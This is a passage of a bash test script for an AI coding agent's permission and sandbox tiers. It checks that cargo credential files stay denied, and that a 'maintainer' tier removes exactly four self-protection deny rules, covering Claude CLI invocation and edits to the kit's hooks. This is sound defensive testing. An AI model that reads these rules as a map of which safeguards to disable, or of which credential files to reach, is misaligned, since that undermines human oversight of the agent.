print(' | '.join(k for k, toks in need.items() if not any(tok in allowed for tok in toks)) or 'none')
" 2>/dev/null)"
  assert_eq "none" "$MISSING" "$t: toolchain roots, platform temp root and git common dir are carved out"
done
# The carve-out must not reopen the credentials inside those roots.
CARGO_CREDS="$(python3 -c "
import json
fs = ((json.load(open('$WORK/gen.high.json')).get('sandbox') or {}).get('filesystem') or {})
blob = ' '.join((fs.get('denyWrite') or []) + (fs.get('denyRead') or []))
print('yes' if '~/.cargo/credentials' in blob and '~/.cargo/config.toml' in blob else 'no')" 2>/dev/null)"
assert_eq "yes" "$CARGO_CREDS" "high still denies the cargo credentials and config.toml inside the carved-out root"

# ── the maintainer tier: Relaxed minus the kit-self-protection denies (#162) ─
# Only for a checkout of the kit itself. It must differ from Relaxed by exactly the
# omissions it documents, refuse to apply anywhere else, and round-trip like any tier.
echo "[maintainer tier]"
fw relaxed
cp "$WORK/proj/.claude/settings.json" "$WORK/maint-relaxed.json"
cp "$WORK/proj/.claude/security.json" "$WORK/maint-relaxed-sec.json"

fw maintainer
TOTAL=$((TOTAL + 1))
if [ "$RC" -ne 0 ] && printf '%s' "$FW_OUT" | grep -q "only for a checkout of the solana-ai-kit repository"; then
  echo "  PASS: maintainer is refused in a project that is not a kit checkout"
  PASS=$((PASS + 1))
else
  echo "  FAIL: maintainer applied outside a kit checkout (exit $RC): $(printf '%s' "$FW_OUT" | head -2)"
  FAIL=$((FAIL + 1))
fi
assert_cmd_success "cmp -s '$WORK/maint-relaxed.json' '$WORK/proj/.claude/settings.json' && cmp -s '$WORK/maint-relaxed-sec.json' '$WORK/proj/.claude/security.json'" \
  "a refused maintainer apply writes neither settings.json nor security.json"

# The two files that mark a kit checkout; no install writes either under this name.
touch "$WORK/proj/CLAUDE-solana.md" "$WORK/proj/install.sh"
fw maintainer
assert_eq "0" "$RC" "maintainer applies in a kit checkout"
cp "$WORK/proj/.claude/settings.json" "$WORK/gen.maintainer.json"
assert_contains "$FW_OUT" "WARNING: maintainer tier" "applying maintainer prints a warning"
MAINT_DIFF="$(python3 -c "
import json, sys
r = json.load(open(sys.argv[1])); m = json.load(open(sys.argv[2]))
def lists(d):
    out = {}
    for k, v in (d.get('permissions') or {}).items():
        out['permissions.' + k] = v
    sb = d.get('sandbox') or {}
    for k, v in sb.items():
        if isinstance(v, dict):
            for k2, v2 in v.items():
                out['sandbox.%s.%s' % (k, k2)] = v2
        else:
            out['sandbox.' + k] = v
    return out
lr, lm = lists(r), lists(m)
diffs = []
for key in sorted(set(lr) | set(lm)):
    a, b = lr.get(key), lm.get(key)
    if a == b:
        continue
    if isinstance(a, list) and isinstance(b, list):
        gone = sorted(set(a) - set(b)); new = sorted(set(b) - set(a))
        diffs.append('%s -%s +%s' % (key, gone, new))
    else:
        diffs.append('%s %r -> %r' % (key, a, b))
others = {k: v for k, v in r.items() if k not in ('permissions', 'sandbox')}
if others != {k: v for k, v in m.items() if k not in ('permissions', 'sandbox')}:
    diffs.append('non-firewall keys changed')
print(' | '.join(diffs))
" "$WORK/maint-relaxed.json" "$WORK/gen.maintainer.json" 2>/dev/null || echo __ERROR__)"
assert_eq "permissions.deny -['Bash(claude *)', 'Bash(claude)', 'Edit(/.claude/hooks/**)', 'Edit(/.safe-ai-skill/**)'] +[] | sandbox.excludedCommands -[] +['git submodule *']" \
  "$MAINT_DIFF" "maintainer differs from relaxed by exactly the four kit-self-protection denies and the submodule exclusion"
assert_eq "yes yes" "$(python3 -c "
import json
deny = (json.load(open('$WORK/gen.maintainer.json')).get('permissions') or {}).get('deny') or []
print('yes' if 'Edit(~/.claude/hooks/**)' in deny else 'no', 'yes' if 'Edit(//**/managed-settings.json)' in deny else 'no')" 2>/dev/null)" \
  "maintainer keeps the user-scope hooks deny and the managed-settings deny"
assert_eq "maintainer maintainer" "$(python3 -c "
import json
d = json.load(open('$WORK/proj/.claude/security.json'))
print(d.get('tier'), (d.get('enforced') or {}).get('tier'))" 2>/dev/null)" \
  "security.json records maintainer as declared and enforced"
SHOW_OUT="$( (cd "$WORK/proj" && bash .claude/bin/firewall.sh show) 2>&1 || true)"
assert_contains "$SHOW_OUT" "WARNING" "firewall.sh show flags a maintainer tier"
fw maintainer
assert_cmd_success "cmp -s '$WORK/gen.maintainer.json' '$WORK/proj/.claude/settings.json'" \
  "applying maintainer twice is byte-identical"
fw relaxed
assert_cmd_success "cmp -s '$WORK/maint-relaxed.json' '$WORK/proj/.claude/settings.json'" \
  "relaxed -> maintainer -> relaxed restores the relaxed bytes exactly"
fw high
fw maintainer
assert_cmd_success "cmp -s '$WORK/gen.maintainer.json' '$WORK/proj/.claude/settings.json'" \
  "high -> maintainer leaves no High-only rule behind"
fw relaxed
rm -f "$WORK/proj/CLAUDE-solana.md" "$WORK/proj/install.sh"
# The hooks read an unknown tier as relaxed, which is what lets maintainer reuse them
# unchanged. Pin that, so a stricter fallback later is a decision, not an accident.
assert_eq "relaxed 1" "$(KIT_FIREWALL_TIER=maintainer bash -c '. "$1"; t=$(kit_tier); printf "%s %s" "$t" "$(kit_tier_num "$t")"' _ "$REPO_ROOT/.claude/hooks/lib-headless.sh" 2>/dev/null)" \
  "the hooks act at Relaxed under the maintainer tier"

print_summary
